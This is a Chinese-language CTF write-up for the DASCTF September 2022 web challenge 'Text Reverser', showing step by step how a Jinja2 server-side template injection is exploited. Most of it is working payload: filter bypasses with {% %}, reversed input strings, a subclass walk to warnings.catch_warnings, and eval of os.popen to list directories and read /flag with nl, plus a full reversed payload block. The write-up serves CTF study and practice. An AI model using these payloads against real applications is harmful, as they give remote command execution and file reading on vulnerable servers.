---
title: DASCTF 2022年9月赛复现
date: '2022/10/16 19:33:01'
categories:
  - - CTF
description: DASCTF 2022年9月赛复现
tags:
---

# DASCTF 2022年9月赛复现

## WEB

### Text Reverser

测试一下发现是模板注入，估计使用了 jinja2 模板

- 先用```{{ 3*3 }}```测试一下，然后发现有过滤

- 用 ```{% %}``` 替换 ```{{ }}```来绕过

- 发现绕是绕过去了，但是没有预期中的执行，观察到 output 出来的东西，是反着的，联想到题目叫 Text Reverser，想着是不是需要反转字符串输入

- 用 ```{% if 1 %}123{% endif %}``` 逆转过来的字符串测试一下，发现能执行

- 配合 print 进行输出，使用 ```{% print(''.__class__) %}``` 的反转

- 寻找子类 ```{% print(''.__class__.__base__.__subclasses__()) %}```

- 这里使用第213个子类，也就是```<class 'warnings.catch_warnings'>```这个子类
 ```{% print(''.__class__.__base__.__subclasses__()[213]) %}```

- 查看当前目录下文件
 ```{% print(''.__class__.__base__.__subclasses__()[213].__init__.__globals__["__builtins__"].eval('__import__("os").popen("ls").read()')) %}```

- 查看根目录下文件 
 ```{% print(''.__class__.__base__.__subclasses__()[213].__init__.__globals__["__builtins__"].eval('__import__("os").popen("ls /").read()')) %}```

- 发现cat指令被过滤了，用```nl```代替```cat```读取文件，得到 flag
 ```{% print(''.__class__.__base__.__subclasses__()[213].__init__.__globals__["__builtins__"].eval('__import__("os").popen("nl /flag").read()')) %}```

整体 payload 如下

```python
}% fidne %{321}% 1 fi %{

}% )__ssalc__.''(tnirp %{

}% ))(__sessalcbus__.__esab__.__ssalc__.''(tnirp %{

}% )]312[)(__sessalcbus__.__esab__.__ssalc__.''(tnirp %{

}% ))')(daer.)"sl"(nepop.)"so"(__tropmi__'(lave.]"__snitliub__"[__slabolg__.__tini__.]312[)(__sessalcbus__.__esab__.__ssalc__.''(tnirp %{

}% ))')(daer.)"/ sl"(nepop.)"so"(__tropmi__'(lave.]"__snitliub__"[__slabolg__.__tini__.]312[)(__sessalcbus__.__esab__.__ssalc__.''(tnirp %{

}% ))')(daer.)"galf/ ln"(nepop.)"so"(__tropmi__'(lave.]"__snitliub__"[__slabolg__.__tini__.]312[)(__sessalcbus__.__esab__.__ssalc__.''(tnirp %{
```

